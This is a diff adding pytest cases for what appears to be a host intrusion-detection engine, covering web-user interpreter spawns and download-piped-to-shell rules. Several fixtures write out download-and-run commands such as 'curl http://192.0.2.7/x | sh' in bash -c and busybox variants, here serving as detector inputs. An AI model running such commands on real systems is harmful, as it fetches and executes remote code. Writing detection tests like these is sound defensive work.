@@ -77,6 +77,38 @@ def test_python_decoded_exec_indicator_is_parsed_not_substring():
     assert not interpreter_indicators(["python3", "-c", "print('exec b64decode is just text here')"])
 
 
+@pytest.mark.parametrize("argv", [
+    ["bash", "-c", "--", "id"],
+    ["bash", "-c", "-x", "id"],
+    ["bash", "-o", "pipefail", "-c", "id"],
+    ["busybox", "sh", "-c", "id"],
+])
+def test_web_user_ambiguous_shell_script_is_unevaluable_but_only_a_rarity_lead(argv):
+    pb = host.WebServiceSpawnsInterpreter()
+
+    immediate = pb.consume([exec_ev(argv, user="www-data")])
+    final = pb.finalize()
+
+    assert immediate == []
+    assert pb.missing_required == 1
+    assert len(final) == 1 and final[0].proposed_lane == "lead"
+    assert final[0].notes == ["rare shape without typed indicators"]
+
+
+def test_web_user_unmodelled_shell_syntax_is_unevaluable_not_an_indicator():
+    pb = host.WebServiceSpawnsInterpreter()
+
+    immediate = pb.consume([
+        exec_ev(["bash", "-c", "x=$(curl http://192.0.2.7/x | sh)"], user="www-data"),
+    ])
+    final = pb.finalize()
+
+    assert immediate == []
+    assert pb.missing_required == 1
+    assert len(final) == 1 and final[0].proposed_lane == "lead"
+    assert all("could not be parsed" not in note for note in final[0].notes)
+
+
 # ---------------------------------------------------------------- downloader feeds interpreter (sequence)
 def test_downloader_and_stdin_shell_with_same_parent():
     d = exec_ev(["curl", "http://192.0.2.7/README.txt.1"], process__ppid=500)
@@ -179,6 +211,20 @@ def test_newline_delimited_download_pipeline_is_detected():
 ])
 def test_shell_data_is_not_a_download_pipeline(script):
     assert run(host.DownloadPipedToShell, [exec_ev(["bash", "-c", script])]) == []
+
+
+@pytest.mark.parametrize("argv", [
+    ["bash", "-c", "--", "curl http://192.0.2.7/x | sh"],
+    ["bash", "-c", "-x", "curl http://192.0.2.7/x | sh"],
+    ["bash", "-o", "pipefail", "-c", "curl http://192.0.2.7/x | sh"],
+    ["busybox", "sh", "-c", "curl http://192.0.2.7/x | sh"],
+])
+@pytest.mark.parametrize("pb_cls", [host.DownloadPipedToShell, host.AuthorizedKeysWrite])
+def test_ambiguous_shell_script_makes_direct_rule_unevaluable(pb_cls, argv):
+    pb = pb_cls()
+
+    assert pb.consume([exec_ev(argv)]) == []
+    assert pb.missing_required == 1
 
 
 # ---------------------------------------------------------------- python pty spawn
